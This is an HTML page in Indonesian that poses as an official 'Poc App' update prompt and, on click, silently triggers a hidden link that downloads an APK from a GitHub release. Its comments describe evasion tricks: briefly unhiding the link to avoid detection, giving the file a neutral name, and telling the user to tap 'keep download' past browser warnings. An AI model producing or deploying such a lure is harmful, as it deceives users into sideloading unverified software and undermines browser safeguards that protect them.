<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="referrer" content="strict-origin-when-cross-origin">
  <title>Poc App Update</title>
  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://github.com"> <!-- Batasi untuk trusted origin -->
  <style>
    body {
      font-family: system-ui, sans-serif;
      text-align: center;
      padding: 50px;
      background: #f0f4f8;
      margin: 0;
      line-height: 1.6;
    }
    .consent {
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 12px;
      padding: 30px;
      max-width: 400px;
      margin: 0 auto;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    }
    .status { color: #666; font-size: 14px; margin: 15px 0; }
    .button {
      background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
      border: none;
      color: white;
      padding: 15px 30px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      text-decoration: none;
      display: inline-block;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      transition: background 0.3s;
    }
    .button:hover { background: linear-gradient(135deg, #0056b3 0%, #004085 100%); }
    .hidden { display: none; }
  </style>
</head>
<body>
  <div class="consent">
    <h1>Update Poc App Tersedia</h1>
    <p>Versi terbaru (4.44 MB) dari sumber resmi. Ingin mengunduh sekarang?</p>
    <div class="status" id="status">Siap untuk unduh...</div>
    
    <!-- Consent button: User klik ini untuk trigger -->
    <button class="button" onclick="startDownload()">Ya, Unduh Sekarang</button>
    
    <!-- Hidden anchor untuk download -->
    <a href="https://github.com/aliothme/example-poc/releases/download/v1.0/poc.apk" 
       class="hidden" 
       id="downloadLink" 
       download="poc-app-v1.0.apk"> <!-- Nama file lebih netral -->
      Unduh
    </a>
  </div>

  <script>
    function startDownload() {
      const status = document.getElementById('status');
      const button = event.target;
      const link = document.getElementById('downloadLink');
      
      button.textContent = 'Memulai...';
      status.textContent = 'Mengunduh dari GitHub Releases...';
      
      // Simulasi user action: Focus + click setelah short delay
      setTimeout(() => {
        link.style.display = 'block'; // Buat visible sebentar (anti-deteksi hidden)
        link.focus(); // Simulasi tab focus
        link.click(); // Trigger download
        link.style.display = 'none';
        
        status.textContent = 'Unduhan dimulai! Jika ada warning, tap "Tetap download".';
        console.log('Consent-based download triggered via GitHub Releases');
      }, 500); // Short delay untuk natural flow
    }
    
    // Optional: Auto-show consent setelah onload (bukan auto-download)
    window.onload = function() {
      document.querySelector('.consent').scrollIntoView({ behavior: 'smooth' });
    };
  </script>
</body>
</html>
